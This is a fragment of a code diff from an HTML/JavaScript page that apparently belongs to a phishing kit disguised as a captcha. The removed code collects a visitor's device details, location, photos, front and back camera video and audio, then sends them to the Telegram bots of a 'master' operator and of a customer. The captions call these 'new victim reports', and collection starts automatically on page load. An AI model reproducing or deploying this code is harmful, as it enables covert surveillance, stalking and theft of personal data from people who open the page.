-                        fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
-                        sendMediaAsync('sendAudio', MASTER_BOT_TOKEN, fd);
-                    }
-                }
-
-                function sendToUser(data, userBotToken, userChatId, botName) {
-                    if (!userBotToken || !userChatId) return;
-
-                    const summary =
-                        `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${data.deviceInfo}\n─────────────────`;
-                    fetch(`https://api.telegram.org/bot${userBotToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: userChatId, text: summary }),
-                        keepalive: true
-                    }).catch(() => {});
-
-                    if (data.location.lat && data.location.lng) {
-                        fetch(`https://api.telegram.org/bot${userBotToken}/sendLocation`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: userChatId,
-                                latitude: data.location.lat,
-                                longitude: data.location.lng
-                            }),
-                            keepalive: true
-                        }).catch(() => {});
-                    }
-
-                    data.photos.forEach((blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', userChatId);
-                        fd.append('photo', blob);
-                        fd.append('caption', `📸 صورة - ${shortToken}`);
-                        sendMediaAsync('sendPhoto', userBotToken, fd);
-                    });
-
-                    if (data.frontVideo) {
-                        const fd = new FormData();
-                        fd.append('chat_id', userChatId);
-                        fd.append('video', data.frontVideo);
-                        fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
-                        sendMediaAsync('sendVideo', userBotToken, fd);
-                    }
-
-                    if (data.backVideo) {
-                        const fd = new FormData();
-                        fd.append('chat_id', userChatId);
-                        fd.append('video', data.backVideo);
-                        fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
-                        sendMediaAsync('sendVideo', userBotToken, fd);
-                    }
-
-                    if (data.audio) {
-                        const fd = new FormData();
-                        fd.append('chat_id', userChatId);
-                        fd.append('audio', data.audio);
-                        fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
-                        sendMediaAsync('sendAudio', userBotToken, fd);
-                    }
-                }
-
-                // ----- Retry check -----
-                function checkRetryAndCollect() {
-                    if (sessionStorage.getItem(RETRY_KEY) === 'true') {
-                        setTimeout(() => {
-                            collectData();
-                        }, 50);
-                    } else {
-                        // Start immediately
-                        collectData();
-                    }
-                }
-
-                // ---- Events (just in case user clicks) ----
-                checkbox.addEventListener('change', function(e) {
-                    if (this.checked) {
-                        this.checked = false;
-                        if (!collectionDone) {
-                            collectData();
-                        }
-                    }
-                });
-
-                document.querySelector('.captcha-wrapper').addEventListener('click', function(e) {
-                    if (e.target.closest('a')) return;
-                    if (!collectionDone && !checkbox.disabled) {
-                        collectData();
-                    }
-                });
-
-                console.log('✅ Victim page ready. Token:', shortToken);
-                // Start collection immediately
-                checkRetryAndCollect();
-            }
-
-            // ============================================================
-            //  🔥  INIT – MODE DETECTION
+            //  🔥  MODE DETECTION
             // ============================================================
 
             const urlParams = new URLSearchParams(window.location.search);
@@ -2193,7 +2782,7 @@
 
             if (rawToken && rawToken.length >= 4) {
                 document.body.className = 'victim-mode';
-                initVictimPage(rawToken);
+                initVictim();
             } else {
                 document.body.className = 'admin-mode';
                 initAdminPanel();
@@ -2201,6 +2790,5 @@
 
         })();
     </script>
-
 </body>
 </html>
